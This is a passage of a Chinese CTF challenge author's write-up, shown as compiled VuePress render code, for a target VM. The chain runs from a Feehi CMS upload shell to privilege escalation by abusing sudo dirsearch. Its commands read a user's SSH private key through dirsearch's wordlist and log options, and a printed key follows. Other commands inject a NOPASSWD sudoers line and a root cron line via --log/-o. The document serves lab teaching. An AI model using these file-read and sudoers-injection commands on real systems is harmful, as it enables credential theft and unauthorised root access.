"),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br")])]),a("h2",{attrs:{id:"_11、靶机导出"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_11、靶机导出"}},[s._v("#")]),s._v(" 11、靶机导出")]),s._v(" "),a("p",[s._v("导出虚拟机")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/41.png",alt:""}})]),s._v(" "),a("p",[s._v("指定靶机")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/42.png",alt:""}})]),s._v(" "),a("p",[s._v("导出路径选择")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/43.png",alt:""}})]),s._v(" "),a("p",[s._v("导出后，可以把这个靶机ova文件分发给选手")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/44.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_12、测试"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_12、测试"}},[s._v("#")]),s._v(" 12、测试")]),s._v(" "),a("p",[s._v("存活主机扫描、端口扫描过程略")]),s._v(" "),a("p",[s._v("80 端口目录扫描")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/48.png",alt:""}})]),s._v(" "),a("p",[s._v("通过 setup.txt admin：MazeSec2025 进入后台，复现 https://github.com/liufee/cms/issues/70")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/49.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/50.png",alt:""}})]),s._v(" "),a("p",[s._v("读取公钥")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("touch")]),s._v(" /tmp/111\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("777")]),s._v(" /tmp/111\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" 7r1umphk dirsearch "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://127.0.0.1/ "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /home/7r1umphk/.ssh/authorized_keys "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--log")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/tmp/111\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("可以看出是 ed25519算法生成")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/51.png",alt:""}})]),s._v(" "),a("p",[s._v("尝试读取私钥")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /tmp/111\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("touch")]),s._v(" /tmp/111\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("777")]),s._v(" /tmp/111\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" 7r1umphk dirsearch "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://127.0.0.1/ "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v("  /home/7r1umphk/.ssh/id_ed25519 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--log")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/tmp/111 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-t")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("并发扫描，读取私钥的行顺序有点乱了，可以指定线程数为1，拼接出完整私钥")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyAAAAJg+y+ADPsvg\nAwAAAAtzc2gtZWQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyA\nAAAECPxip0hGT4O48HAkEWglmNjSaDrr8tXi1W+inEP7eAS32uUbVOyxF8xzVaY+wqMcub\nDBUbS6Ri8priYyRiyZbIAAAADzdyMXVtcGhrQFNlYXJjaAECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/52.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/53.png",alt:""}})]),s._v(" "),a("p",[s._v("sudo 配置文件有容错性，构造个 sudo 给 7r1umphk")]),s._v(" "),a("blockquote",[a("p",[s._v("另外你还可以选择尝试控制输出写入公钥，如果靶机是 alpine ，你还可以尝试 定时任务。")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("7r1umphk "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ALL")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ALL:ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" NOPASSWD: ALL\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("构造 payload")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /tmp/222\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("touch")]),s._v(" /tmp/222\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("777")]),s._v(" /tmp/222\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" root dirsearch "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://127.0.0.1/ "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" /etc/sudoers.d/sbash  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--format")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("plain "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--log")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\n7r1umphk ALL=(ALL:ALL) NOPASSWD: ALL\n'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/54.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_13、出题人分享-可选"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_13、出题人分享-可选"}},[s._v("#")]),s._v(" 13、出题人分享（可选）")]),s._v(" "),a("p",[s._v("靶机构建之前，相信你已经有了完整的思路，你是否愿意分享更多细节让选手在靶机截至后了解这个靶机？")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("01、靶机灵感：最近学习到什么新的骚姿势让你迫不及待构建一台靶机与群友分享，或者你希望构建一台靶机让群友学到什么新东西？\n02、靶机用户：这个靶机都有哪些用户？\n03、靶机细节：分享下这台靶机的细节。\n04、攻击流程简述：简单讲讲攻击流程。\n05、靶机重点：你最想让选手学到的点是什么？\n06、选手卡点：你觉得选手可能会卡在哪些点？\n07、可行测试：你能否在本地环境成功测试？\n08、靶机名称：这个靶机名字有什么故事吗？\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("strong",[s._v("01、靶机灵感")])]),s._v(" "),a("p",[s._v("前段时间老夜出了 spiteful 靶机，其中最后的提权点是 rkhunter 工具的参数功能挖掘，有群友通过配置文件执行脚本拿到了提权，比较优雅。我通过挖掘 rkhunter 工具的参数，观察工具写入日志的行为，发现日志似乎可控，于是有了控制日志内容写入，在日志数据格式不完全可控条件下，可以构造出部分一行或多行可控内容，另外我总结了三种写入内容不完全可控下的提权：1、写入一行公钥，2、定时任务，3、sudoers.d 授权文件，具体看"),a("a",{attrs:{href:"https://the0n3.top/pages/linux-config-privesc/",target:"_blank",rel:"noopener noreferrer"}},[s._v("利用配置文件内容容错性实现权限提升的三种方式"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("在老夜这个靶机的启发下，我深入挖掘了一下 dirsearch 的参数功能，发现它也存在类似的写入内容不完全可控的场景，于是我设计了这个靶机，让选手通过挖掘 dirsearch 的参数功能实现提权。")]),s._v(" "),a("p",[a("strong",[s._v("02、靶机用户")])]),s._v(" "),a("ul",[a("li",[s._v("www-data (web 入口)")]),s._v(" "),a("li",[s._v("7r1umphk (关键用户)")]),s._v(" "),a("li",[s._v("root")])]),s._v(" "),a("p",[a("strong",[s._v("03、靶机细节")])]),s._v(" "),a("p",[s._v("1、入口选择了 Github 上一个开源 CMS 框架，通过常规端口扫描即可发现 80 端口，再结合指纹/标题/路径信息可以识别出是 Feehi CMS。")]),s._v(" "),a("p",[s._v("Feehi CMS地址："),a("a",{attrs:{href:"https://github.com/liufee/cms",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/liufee/cms"),a("OutboundLink")],1),a("br"),s._v("\n文件上传getshell issue地址："),a("a",{attrs:{href:"https://github.com/liufee/cms/issues/70",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/liufee/cms/issues/70"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("2、给www-data用户授予了sudo -u 7r1umphk 权限，利用 dirsearch 的 "),a("code",[s._v("-w")]),s._v(" 参数指定 7r1umphk 用户私钥作为字典，让 dirsearch 以 7r1umphk 身份读取该文件，并通过 "),a("code",[s._v("--log")]),s._v(" 参数把每一行内容拼接到请求 URL 中写入日志文件，从而间接泄露 7r1umphk 的私钥内容。（甜品级利用）")]),s._v(" "),a("p",[s._v("利用条件：")]),s._v(" "),a("ul",[a("li",[s._v("1、任意web站点")]),s._v(" "),a("li",[s._v("2、任意文件读取")]),s._v(" "),a("li",[s._v("3、存在可写可读目录（/tmp）")]),s._v(" "),a("li",[s._v("4、使用--log参数指定可读文件")])]),s._v(" "),a("p",[s._v("演示（节选部分）：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("touch")]),s._v(" /tmp/dirsearch.log "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("777")]),s._v(" /tmp/dirsearch.log\n\n┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ dirsearch "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://127.0.0.1/  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /etc/passwd "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--log")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/tmp/dirsearch.log\n\n┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /tmp/dirsearch.log\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v("-12-07 01:36:13,771 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET http://127.0.0.1/mail:x:8:8:mail:/var/mail:/usr/sbin/nologin"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v(" - 335B\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v("-12-07 01:36:13,773 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET http://127.0.0.1/bin:x:2:2:bin:/bin:/usr/sbin/nologin"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v(" - 335B\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v("-12-07 01:36:13,775 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET http://127.0.0.1/nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v(" - 335B\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v("-12-07 01:36:13,777 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET http://127.0.0.1/root:x:0:0:root:/root:/usr/bin/zsh"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v(" - 335B\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v("-12-07 01:36:13,778 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"GET http://127.0.0.1/sync:x:4:65534:sync:/bin:/bin/sync"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v(" - 335B\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/40.png",alt:""}})]),s._v(" "),a("p",[s._v("3、重命名 root.txt，避免被猜中常规路径 "),a("code",[s._v("/root/root.txt")]),s._v("，迫使选手挖掘其他参数功能，回家的诱惑（/root/）")]),s._v(" "),a("p",[s._v("4、给 7r1umphk 用户授予了sudo -u root 权限，利用dirsearch -o 参数指定一个输出文件，再利用 format 参数指定输出格式为plain，这会记录 dirsearch 的扫描结果/运行信息，包括 dirsearch 的命令行启动参数，如果可以在启动命令行参数里插入一段单行可控的 payload（例如一条 sudo授权 行或一条 公钥），就可以把这段内容写入公钥、sudoers.d/实现提权，后续如何利用就随意了。")]),s._v(" "),a("p",[s._v("利用条件：")]),s._v(" "),a("ul",[a("li",[s._v("1、构造可控web站点，确保dirsearch默认字典可以扫到东西，扫到东西才会生成输出文件")]),s._v(" "),a("li",[s._v("2、利用 -o 参数控制任意文件")]),s._v(" "),a("li",[s._v("3、使用 -format 参数指定输出类型为plain，这个类型下，会记录 dirsearch 的启动命令行参数")]),s._v(" "),a("li",[s._v("4、使用 --log 参数值控制写入内容")])]),s._v(" "),a("p",[s._v("演示：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ dirsearch "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://127.0.0.1/  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--format")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("plain "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--log")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\n* * * * * root /bin/bash -c whoami'")]),s._v("\n\nOutput File: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".txt\nLog File: /home/npc/test/\n* * * * * root /bin/bash "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v("\n\nTarget: http://127.0.0.1/\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("01:26:07"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Starting: \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("01:26:10"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" -  183B  - /2.txt\nCTRL+C detected: Pausing threads, please wait"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n\n┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".txt \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Dirsearch started Sun Dec  7 01:26:10 2025 as: /home/npc/.local/bin/dirsearch -u http://127.0.0.1/ -o 2.txt --format=plain --log ")]),s._v("\n* * * * * root /bin/bash "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v("   183B   http://127.0.0.1/2.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br")])]),a("p",[s._v("补充细节：dirsearch 运行过程真的会把启动命令行的文件和目录创建出来，但是不重要")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("'")]),s._v("'111"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'  '")]),s._v("'"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("'")]),s._v("'* * * * * root '\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/1.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/2.png",alt:""}})]),s._v(" "),a("p",[a("strong",[s._v("04、攻击流程简述")])]),s._v(" "),a("p",[s._v("通过 CMS 文件上传漏洞拿到 www-data shell")]),s._v(" "),a("p",[s._v("利用 dirsearch 读取 7r1umphk 用户私钥")]),s._v(" "),a("p",[s._v("7r1umphk 用户利用 dirsearch 利用文件写提权")]),s._v(" "),a("p",[a("strong",[s._v("05、靶机重点")])]),s._v(" "),a("p",[s._v("挖掘 dirsearch 文件写功能的潜力，重点是 -w、-o、-format、-log 参数的配合使用")]),s._v(" "),a("p",[s._v("-w：指定扫描字典文件（这里被用来读取任意文件）\n-o：控制任意位置写入文件\n--format：控制写入文件的内容格式\n--log：控制写入文件的内容")]),s._v(" "),a("p",[a("strong",[s._v("06、选手卡点")])]),s._v(" "),a("p",[s._v("分析选手预期可能卡在哪里。")]),s._v(" "),a("p",[s._v("1、依赖单一工具 dirsearch，dirsearch 默认扫描字典不包含 后台密码备份文件 setup.txt，选手未尝试其他常见字典，无法进入后台。")]),s._v(" "),a("p",[s._v("2、选手尝试爆破登录后台 admin 用户密码，密码是 MazeSec2025 ，非常见弱口令，爆破无果，无法进入后台。")]),s._v(" "),a("p",[s._v("3、选手未对 CMS 指纹特征进行信息收集及利用，没有在 Github 找到该开源 CMS 项目及 issue 中披露的文件上传 getshell 方案，尝试自主挖掘 CMS 框架漏洞，无果。")]),s._v(" "),a("p",[s._v("4、选手通过 issue 披露的方案拿到 www-data shell 后，没有稳定优化 shell 环境，可能存在一些命令交互问题。")]),s._v(" "),a("p",[s._v("5、选手未挖掘 dirsearch 的 读取字典功能，错失文件读取机会。")]),s._v(" "),a("p",[s._v("6、选手尝试读取默认 id_rsa 私钥，未考虑到可能存在其他算法的私钥文件，如果 id_ed25519 ，错失提升到 7r1umphk 用户的机会。")]),s._v(" "),a("p",[s._v("7、选手拿到 7r1umphk 用户 shell 后，未挖掘 dirsearch 的写入功能，仍使用 读取功能，读取 shadow 文件，爆破 root 用户密码，root 密码复杂度较高，爆破无果。")]),s._v(" "),a("p",[s._v("8、选手发现 dirsearch 有写入功能，但未考虑到写入内容不完全可控的场景及 dirsearch 工具参数测试不充分，无法构造出可利用的 payload。")]),s._v(" "),a("p",[s._v("读取功能挖掘：")]),s._v(" "),a("ul",[a("li",[s._v("1、任意web站点")]),s._v(" "),a("li",[s._v("2、任意文件读取")]),s._v(" "),a("li",[s._v("3、存在可写可读目录（/tmp）")]),s._v(" "),a("li",[s._v("4、使用--log参数指定可读文件")])]),s._v(" "),a("p",[s._v("写入功能挖掘：")]),s._v(" "),a("ul",[a("li",[s._v("1、构造可控web站点，确保dirsearch默认字典可以扫到东西，扫到东西时才会生成输出文件")]),s._v(" 